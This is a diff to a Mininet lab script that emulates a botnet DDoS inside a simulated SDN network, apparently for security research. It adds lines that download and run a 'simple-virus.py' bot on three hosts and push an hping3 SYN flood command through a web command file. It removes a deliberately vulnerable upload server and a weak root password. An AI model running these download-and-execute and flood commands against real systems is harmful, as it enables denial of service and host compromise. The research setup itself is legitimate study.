@@ -1,3 +1,4 @@
+import time
 from subprocess import Popen
 
 from mininet.net import Mininet
@@ -6,6 +7,12 @@ from mininet.log import setLogLevel
 
 
 def create_network():
+    # Ensure that the network is clean
+    Popen("mn -c", shell=True).wait()
+
+    # Ensure required packages are installed
+    Popen("apt-get update && apt-get install -y bwm-ng tcpdump hping3", shell=True).wait()
+
     # Create a network
     net = Mininet(controller=OVSController)
 
@@ -48,42 +55,53 @@ def create_network():
     # Create a command file
     h5.cmd('echo "ls" > /var/www/html/command')
 
-    # Install php and apache on h2
-    h2.cmd('apt-get update && apt-get install -y apache2 php')
-    # Start apache
-    h2.cmd('service apache2 start')
-    # Download the vulnerable web application
-    h2.cmd('rm /var/www/html/index.html')
-    h2.cmd('wget https://raw.githubusercontent.com/ozeliurs/SDN-Security/main/papers/.project-files/ddos-attack/vuln-webserver.php -O /var/www/html/upload.php')
-    # Allow uploads
-    h2.cmd('mkdir /var/www/html/uploads && chmod 777 /var/www/html/uploads')
-
-    # Enable SSH on h5
-    h5.cmd('apt-get update')
-    h5.cmd('apt-get install -y openssh-server')
-    # Set a weak password for root (toor)
-    h5.cmd('echo "root:toor" | chpasswd')
-
-    # Simulate phishing on h4
-    h4.cmd('wget https://raw.githubusercontent.com/ozeliurs/SDN-Security/main/papers/.project-files/ddos-attack/simple-virus.py -O virus.py')
-    h4.cmd('python virus.py &')
+    # Simulate Infection
+    for host in [h2, h4, h5]:
+        host.cmd('wget https://raw.githubusercontent.com/ozeliurs/SDN-Security/main/papers/.project-files/ddos-attack/simple-virus.py -O virus.py')
+        host.cmd('python virus.py &')
 
     # Start Monitoring
-    Popen("bwm-ng -o csv -T rate -C ',' > /tmp/mon &", shell=True).wait()
+    Popen("rm /tmp/mon.csv", shell=True).wait()
+    Popen("bwm-ng -o csv -T rate -C ',' > /tmp/mon.csv &", shell=True).wait()
 
     # Start Capturing
     for i in range(1, 4):
         for j in range(1, 3):
+            Popen(f"rm /tmp/s{i}-eth{j}.pcap", shell=True).wait()
             Popen(f"tcpdump -i s{i}-eth{j} -w /tmp/s{i}-eth{j}.pcap &", shell=True).wait()
 
     net.pingAll()
 
-    input("Press Enter to stop the network...")
+    # Wait for the network to stabilize
+    time.sleep(10)
+
+    # Start the attack
+    h5.cmd('echo "hping3 -S --flood -V -p 80 10.42.0.1" > /var/www/html/command')
+
+    # ping h3 to h1 continuously until a key is pressed
+    try:
+        while True:
+            net.ping([h3, h1])
+            time.sleep(1)
+    except KeyboardInterrupt:
+        pass
+
+    print("Stopping the attack...")
+
+    for host in [h2, h4, h5]:
+        host.cmd('killall python')
+
+    # Wait for the network to stabilize
+    time.sleep(10)
+
+    print("Stopping the monitoring...")
 
     # Stop the capturing
     Popen("killall tcpdump", shell=True).wait()
     # Stop the monitoring
     Popen("killall bwm-ng", shell=True).wait()
+
+    print("Stopping the network...")
 
     # Stop the network
     net.stop()
